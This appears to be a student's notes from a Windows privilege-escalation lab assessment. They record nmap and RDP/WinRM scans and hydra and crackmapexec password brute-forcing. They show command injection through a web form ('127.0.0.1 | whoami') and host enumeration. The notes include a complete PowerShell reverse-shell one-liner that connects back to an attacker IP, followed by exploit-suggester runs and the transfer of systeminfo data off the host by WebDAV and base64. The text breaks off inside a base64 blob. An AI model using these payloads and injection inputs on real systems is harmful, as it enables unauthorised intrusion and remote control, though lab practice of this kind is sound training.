# Windows Privilege Escalation Skills Assessment - Part I

## Global nmap

sudo nmap -sC -sV -oA nmap 10.129.225.46 --stats-every=5s

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 11:36 GMT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.33 seconds

ping 10.129.225.46
PING 10.129.225.46 (10.129.225.46) 56(84) bytes of data.
^C
--- 10.129.225.46 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3048ms

sudo nmap 10.129.249.157 -p- -sV --stats-every=5s -v
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 11:40 GMT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 11:40
Scanning 10.129.249.157 [4 ports]
Completed Ping Scan at 11:40, 3.03s elapsed (1 total hosts)
Nmap scan report for 10.129.249.157 [host down]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.24 seconds
           Raw packets sent: 8 (304B) | Rcvd: 0 (0B)

## Nmap RDP

nmap -sV -sC $TARGET -p3389 --script rdp*

Nmap scan report for 10.129.249.157
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|_  RDP Protocol Version:  RDP 10.2 server
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-05T12:28:26+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

nmap -sV --script=rdp-vuln-ms12-020 -p 3389 $TARGET 

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 12:30 GMT
Nmap scan report for 10.129.249.157
Host is up (0.016s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds

xfreerdp /v:$TARGET

Certificate details for 10.129.249.157:3389 (RDP-Server):
	Common Name: WINLPE-SKILLS1-SRV
	Subject:     CN = WINLPE-SKILLS1-SRV
	Issuer:      CN = WINLPE-SKILLS1-SRV
	Thumbprint:  93:52:f6:31:26:2d:32:2f:d3:f7:f2:cc:12:aa:a7:0b:f1:61:19:0e:3d:9f:d7:84:00:95:e7:35:4c:85:2e:83
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Domain:   WINLPE-SKILLS1-
Password: 
[12:35:37:151] [4169:4170] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
[12:35:37:151] [4169:4170] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]


nmap -sV -sC $TARGET -p3389 --packet-trace --disable-arp-ping -n

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2024-02-04T11:38:04
|_Not valid after:  2024-08-05T11:38:04
|_ssl-date: 2024-02-05T12:37:53+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-05T12:37:46+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## RDP footprinting

sudo cpan
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl $TARGET

Can't locate Encoding/BER.pm in @INC (you may need to install the Encoding::BER module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.32.1 /usr/local/share/perl/5.32.1 /usr/lib/x86_64-linux-gnu/perl5/5.32 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.32 /usr/share/perl/5.32 /usr/local/lib/site_perl) at ./rdp-sec-check.pl line 43.
BEGIN failed--compilation aborted at ./rdp-sec-check.pl line 43.

## Nmap WinRM 

nmap -sV -sC $TARGET -p5985,5986 --disable-arp-ping -n

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 19:18 GMT
Nmap scan report for 10.129.173.15
Host is up (0.017s latency).

PORT     STATE    SERVICE VERSION
5985/tcp filtered wsman
5986/tcp filtered wsmans

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds

## WinRM Bruteforce

wget -c https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt -O users.list
wget -c https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O 10-million-password-list-top-1000.list

crackmapexec winrm $TARGET -u users.list -p 10-million-password-list-top-1000.list

hydra -L users.list -P 10-million-password-list-top-1000.list smb://$TARGET

hydra -L users.list -P 10-million-password-list-top-1000.list rdp://$TARGET

hydra -l ldapadmin -P /opt/useful/SecLists/Passwords/xato-net-10-million-passwords-10000.txt rdp://$TARGET

[STATUS] 516.32 tries/min, 9810 tries in 00:19h, 190 to do in 00:01h, 4 active
1 of 1 target completed, 0 valid password found


## Browse http page

http://10.129.173.15/

127.0.0.1 | whoami

iis apppool\defaultapppool

## Enumeration

127.0.0.1 | wmic qfe

Caption CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status http://support.microsoft.com/?kbid=3199986 WINLPE-SKILLS1- Update KB3199986 NT AUTHORITY\SYSTEM 11/21/2016 http://support.microsoft.com/?kbid=3200970 WINLPE-SKILLS1- Security Update KB3200970 NT AUTHORITY\SYSTEM 11/21/2016 

127.0.0.1 | set

ALLUSERSPROFILE=C:\ProgramData APPDATA=C:\Windows\system32\config\systemprofile\AppData\Roaming APP_POOL_CONFIG=C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config APP_POOL_ID=DefaultAppPool CommonProgramFiles=C:\Program Files\Common Files CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files CommonProgramW6432=C:\Program Files\Common Files COMPUTERNAME=WINLPE-SKILLS1- ComSpec=C:\Windows\system32\cmd.exe LOCALAPPDATA=C:\Windows\system32\config\systemprofile\AppData\Local NUMBER_OF_PROCESSORS=6 OS=Windows_NT Path=C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD PROCESSOR_LEVEL=23 PROCESSOR_REVISION=3100 ProgramData=C:\ProgramData ProgramFiles=C:\Program Files ProgramFiles(x86)=C:\Program Files (x86) ProgramW6432=C:\Program Files PROMPT=$P$G PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules PUBLIC=C:\Users\Public SystemDrive=C: SystemRoot=C:\Windows TEMP=C:\Windows\TEMP TMP=C:\Windows\TEMP USERDOMAIN=WORKGROUP USERNAME=WINLPE-SKILLS1-$ USERPROFILE=C:\Windows\system32\config\systemprofile windir=C:\Windows 

127.0.0.1 | systeminfo

Host Name: WINLPE-SKILLS1- OS Name: Microsoft Windows Server 2016 Standard OS Version: 10.0.14393 N/A Build 14393 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00376-30821-30176-AA757 Original Install Date: 5/25/2021, 8:57:43 PM System Boot Time: 2/5/2024, 11:16:23 AM System Manufacturer: VMware, Inc. System Model: VMware7,1 System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume2 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-08:00) Pacific Time (US & Canada) Total Physical Memory: 4,095 MB Available Physical Memory: 3,366 MB Virtual Memory: Max Size: 4,799 MB Virtual Memory: Available: 4,091 MB Virtual Memory: In Use: 708 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): 2 Hotfix(s) Installed. [01]: KB3199986 [02]: KB3200970 Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 DHCP Enabled: Yes DHCP Server: 10.129.0.1 IP address(es) [01]: 10.129.173.15 [02]: fe80::b567:e155:cb11:70cc [03]: dead:beef::b567:e155:cb11:70cc [04]: dead:beef::d7 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.

127.0.0.1 | query user

--> nothing

127.0.0.1 | whoami /priv

PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token Disabled 
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled 
SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege Create global objects Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 

127.0.0.1 | whoami /groups

GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== 
Mandatory Label\High Mandatory Level Label S-1-16-12288 
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group
Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled group


127.0.0.1 | net user

User accounts for \\ ------------------------------------------------------------------------------- 
Administrator DefaultAccount Guest htb-student mrb3n The command completed with one or more errors. 

127.0.0.1 | net localgroup

Aliases for \\WINLPE-SKILLS1- ------------------------------------------------------------------------------- *Access Control Assistance Operators *Administrators *Backup Operators *Certificate Service DCOM Access *Cryptographic Operators *Distributed COM Users *Event Log Readers *Guests *Hyper-V Administrators *IIS_IUSRS *Network Configuration Operators *Performance Log Users *Performance Monitor Users *Power Users *Print Operators *RDS Endpoint Servers *RDS Management Servers *RDS Remote Access Servers *Remote Desktop Users *Remote Management Users *Replicator *Storage Replica Administrators *System Managed Accounts Group *Users The command completed successfully. 

127.0.0.1 | net localgroup administrators

Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator mrb3n The command completed successfully. 

127.0.0.1 | net accounts

Force user logoff how long after time expires?: Never Minimum password age (days): 0 Maximum password age (days): Unlimited Minimum password length: 0 Length of password history maintained: None Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: SERVER The command completed successfully. 

## Reverse Shell

https://www.revshells.com/

nc -lvnp 9500

127.0.0.1 | powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.95', 9500);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

SHELL> pwd

Path                       
----                       
C:\windows\system32\inetsrv


SHELL> systeminfo

Host Name:                 WINLPE-SKILLS1-
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30821-30176-AA757
Original Install Date:     5/25/2021, 8:57:43 PM
System Boot Time:          2/5/2024, 11:16:23 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,292 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 4,012 MB
Virtual Memory: In Use:    787 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB3200970
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.173.15
                                 [02]: fe80::b567:e155:cb11:70cc
                                 [03]: dead:beef::b567:e155:cb11:70cc
                                 [04]: dead:beef::d7
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


## Enumerate vulnerabilities

### Windows-Exploit-Suggester-2

git clone https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2
cd Windows-Exploit-Suggester-2

vi WINLPE-systeminfo.txt

python2.7 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2024-02-05-mssb.xlsx
[+] Don't forget to convert the file to .xls file before proceeding further!!!
[+] Use a spreadsheet software (LibreOffice Calc, MS Excel) and save the file as .xls
[+] Remove the old .xlsx file after saving it as .xls
[*] done



sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install
sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install

python2.7 windows-exploit-suggester.py --database 2021-04-16-mssb.xls --systeminfo WINLPE-systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 2 hotfix(es) against the 65 potential bulletins(s) with a database of 137 known exploits
[*] there are now 53 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2016 64-bit'
[*] 
[*] done

git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester

python2.7 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2024-02-05-mssb.xls
[*] done

pip install xlrd & pip install xlrd --upgrade

python2.7 windows-exploit-suggester.py --database 2024-02-05-mssb.xls --systeminfo systeminfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[-] unable to determine the windows versions from the input file specified. consider using --ostext option to force detection (example: --ostext 'windows 7 sp1 64-bit')

python2.7 windows-exploit-suggester.py --database 2024-02-05-mssb.xls --systeminfo systeminfo.txt --ostext 'Windows 2016 64-bit'

### Windows-Exploit-Suggester-2 with exact sysinfo extracted from target

systeminfo > c:\users\Public\sysinfo.txt

searchsploit Windows Server 2016

sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

dir \\192.168.49.128\DavWWWRoot
copy c:\users\Public\sysinfo.txt \\192.168.49.129\DavWWWRoot\

[Convert]::ToBase64String((Get-Content -path "c:\users\Public\sysinfo.txt" -Encoding byte))

echo //4NAAoASABvAHMAdAAgAE4AYQBtAGUAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBJAE4ATABQAEUALQBTAEsASQBMAEwAUwAxAC0ADQAKAE8AUwAgAE4AYQBtAGUAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADEANgAgAFMAdABhAG4AZABhAHIAZAANAAoATwBTACAAVgBlAHIAcwBpAG8AbgA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMQAwAC4AMAAuADEANAAzADkAMwAgAE4ALwBBACAAQgB1AGkAbABkACAAMQA0ADMAOQAzAA0ACgBPAFMAIABNAGEAbgB1AGYAYQBjAHQAdQByAGUAcgA6ACAAIAAgACAAIAAgACAAIAAgACAAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgANAAoATwBTACAAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA6ACAAIAAgACAAIAAgACAAIAAgACAAUwB0AGEAbgBkAGEAbABvAG4AZQAgAFMAZQByAHYAZQByAA0ACgBPAFMAIABCAHUAaQBsAGQAIABUAHkAcABlADoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABNAHUAbAB0AGkAcAByAG8AYwBlAHMAcwBvAHIAIABGAHIAZQBlAA0ACgBSAGUAZwBpAHMAdABlAHIAZQBkACAATwB3AG4AZQByADoAIAAgACAAIAAgACAAIAAgACAAIABXAGkAbgBkAG8AdwBzACAAVQBzAGUAcgANAAoAUgBlAGcAaQBzAHQAZQByAGUAZAAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuADoAIAAgACAADQAKAFAAcgBvAGQAdQBjAHQAIABJAEQAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAMAAzADcANgAtADMAMAA4ADIAMQAtADMAMAAxADcANgAtAEEAQQA3ADUANwANAAoATwByAGkAZwBpAG4AYQBsACAASQBuAHMAdABhAGwAbAAgAEQAYQB0AGUAOgAgACAAIAAgACAANQAvADIANQAvADIAMAAyADEALAAgADgAOgA1ADcAOgA0ADMAIABQAE0ADQAKAFMAeQBzAHQAZQBtACAAQgBvAG8AdAAgAFQAaQBtAGUAOgAgACAAIAAgACAAIAAgACAAIAAgADIALwA2AC8AMgAwADIANAAsACAAMQAxADoANAA4ADoAMQAwACAAQQBNAA0ACgBTAHkAcwB0AGUAbQAgAE0AYQBuAHUAZgBhAGMAdAB1AHIAZQByADoAIAAgACAAIAAgACAAIABWAE0AdwBhAHIAZQAsACAASQBuAGMALgANAAoAUwB5AHMAdABlAG0AIABNAG8AZABlAGwAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVgBNAHcAYQByAGUANwAsADEADQAKAFMAeQBzAHQAZQBtACAAVAB5AHAAZQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHgANgA0AC0AYgBhAHMAZQBkACAAUABDAA0ACgBQAHIAbwBjAGUAcwBzAG8AcgAoAHMAKQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAyACAAUAByAG8AYwBlAHMAcwBvAHIAKABzACkAIABJAG4AcwB0AGEAbABsAGUAZAAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbADAAMQBdADoAIABBAE0ARAA2ADQAIABGAGEAbQBpAGwAeQAgADIAMwAgAE0AbwBkAGUAbAAgADQAOQAgAFMAdABlAHAAcABpAG4AZwAgADAAIABBAHUAdABoAGUAbgB0AGkAYwBBAE0ARAAgAH4AMgA5ADkANAAgAE0AaAB6AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbADAAMgBdADoAIABBAE0ARAA2ADQAIABGAGEAbQBpAGwAeQAgADIAMwAgAE0AbwBkAGUAbAAgADQAOQAgAFMAdABlAHAAcABpAG4AZwAgADAAIABBAHUAdABoAGUAbgB0AGkAYwBBAE0ARAAgAH4AMgA5ADkANAAgAE0AaAB6AA0ACgBCAEkATwBTACAAVgBlAHIAcwBpAG8AbgA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAE0AdwBhAHIAZQAsACAASQBuAGMALgAgAFYATQBXADcAMQAuADAAMABWAC4AMQA2ADcAMAA3ADcANwA2AC4AQgA2ADQALgAyADAAMAA4ADAANwAwADIAMwAwACwAIAA4AC8ANwAvADIAMAAyADAADQAKAFcAaQBuAGQAbwB3AHMAIABEAGkAcgBlAGMAdABvAHIAeQA6ACAAIAAgACAAIAAgACAAIAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMADQAKAFMAeQBzAHQAZQBtACAARABpAHIAZQBjAHQAbwByAHkAOgAgACAAIAAgACAAIAAgACAAIAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIADQAKAEIAbwBvAHQAIABEAGUAdgBpAGMAZQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFwARABlAHYAaQBjAGUAXABIAGEAcgBkAGQAaQBzAGsAVgBvAGwAdQBtAGUAMgANAAoAUwB5AHMAdABlAG0AIABMAG8AYwBhAGwAZQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZQBuAC0AdQBzADsARQBuAGcAbABpAHMAaAAgACgAVQBuAGkAdABlAGQAIABTAHQAYQB0AGUAcwApAA0ACgBJAG4AcAB1AHQAIABMAG8AYwBhAGwAZQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABlAG4ALQB1AHMAOwBFAG4AZwBsAGkAcwBoACAAKABVAG4AaQB0AGUAZAAgAFMAdABhAHQAZQBzACkADQAKAFQAaQBtAGUAIABaAG8AbgBlADoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACgAVQBUAEMALQAwADgAOgAwADAAKQAgAFAAYQBjAGkAZgBpAGMAIABUAGkAbQBlACAAKABVAFMAIAAmACAAQwBhAG4AYQBkAGEAKQANAAoAVABvAHQAYQBsACAAUABoAHkAcwBpAGMAYQBsACAATQBlAG0AbwByAHkAOgAgACAAIAAgACAANAAsADAAOQA1ACAATQBCAA0ACgBBAHYAYQBpAGwAYQBiAGwAZQAgAFAAaAB5AHMAaQBjAGEAbAAgAE0AZQBtAG8AcgB5ADoAIAAzACwAMwAwADIAIABNAEIADQAKAFYAaQByAHQAdQBhAGwAIABNAGUAbQBvAHIAeQA6ACAATQBhAHgAIABTAGkAegBlADoAIAAgADQALAA3ADkAOQAgAE0AQgANAAoAVgBpAHIAdAB1AGEAbAAgAE0AZQBtAG8AcgB5ADoAIABBAHYAYQBpAGwAYQBiAGwAZQA6ACAANAAsADAAMwAxACAATQBCAA0ACgBWAGkAcgB0AHUAYQBsACAATQBlAG0AbwByAHkAOgAgAEkAbgAgAFUAcwBlADoAIAAgACAAIAA3ADYAOAAgAE0AQgANAAoAUABhAGcAZQAgAEYAaQBsAGUAIABMAG8AYwBhAHQAaQBvAG4AKABzACkAOgAgACAAIAAgACAAQwA6AFwAcABhAGcAZQBmAGkAbABlAC4AcwB5AHMADQAKAEQAbwBtAGEAaQBuADoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcATwBSAEsARwBSAE8AVQBQAA0ACgBMAG8AZwBvAG4AIABTAGUAcgB2AGUAcgA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABOAC8AQQANAAoASABvAHQAZgBpAHgAKABzACkAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMgAgAEgAbwB0AGYAaQB4ACgAcwApACAASQBuAHMAdABhAGwAbABlAGQALgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwAwADEAXQA6ACAASwBCADMAMQA5ADkAOQA4ADYADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAMAAyAF0AOgAgAEsAQgAzADIAMAAwADkANwAwAA0ACgBOAGUAdAB3AG8AcgBrACAAQwBhAHIAZAAoAHMAKQA6ACAAIAAgACAAIAAgACAAIAAgACAAIAAxACAATgBJAEMAKABzACkAIABJAG4AcwB0AGEAbABsAGUAZAAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbADAAMQBdADoAIAB2AG0AeABuAGUAdAAzACAARQB0AGgAZQByAG4AZQB0ACAAQQBkAGEAcAB0AGUAcgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAE4AYQBtAGUAOgAgAEUAdABoAGUAcgBuAGUAdAAwAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEgAQwBQACAARQBuAGEAYgBsAGUAZAA6ACAAIAAgACAAWQBlAHMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQASABDAFAAIABTAGUAcgB2AGUAcgA6ACAAIAAgACAAIAAxADAALgAxADIAOQAuADAALgAxAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAFAAIABhAGQAZAByAGUAcwBzACgAZQBzACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAMAAxAF0AOgAgADEAMAAuADEAMgA5AC4AMgAyADUALgA0ADYADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAMAAyAF0AOgAgAGYAZQA4ADAAOgA6AGYAMQBiADAAOgBjADgANwA6AGMAMQA1ADgAOgAyAGQAYwA0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbADAAMwBdADoAIABkAGUAYQBkADoAYgBlAGUAZgA6ADoAZgAxAGIAMAA6AGMAOAA3ADoAYwAxADUAOAA6ADIAZABjADQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAMAA0AF0AOgAgAGQAZQBhAGQAOgBiAGUAZQBmADoAOgA2AGEADQAKAEgAeQBwAGUAcgAtAFYAIABSAGUAcQB1AGkAcgBlAG0AZQBuAHQAcwA6ACAAIAAgACAAIAAgAEEAIABoAHkAcABlAHIAdgBpAHMAbwByACAAaABhAHMAIABiAGUAZQBuACAAZABlAHQAZQBjAHQAZQBkAC4AIABGAGUAYQB0AHUAcgBlAHMAIAByAGUAcQB1AGkAcgBlAGQAIABmAG8AcgAgAEgAeQBwA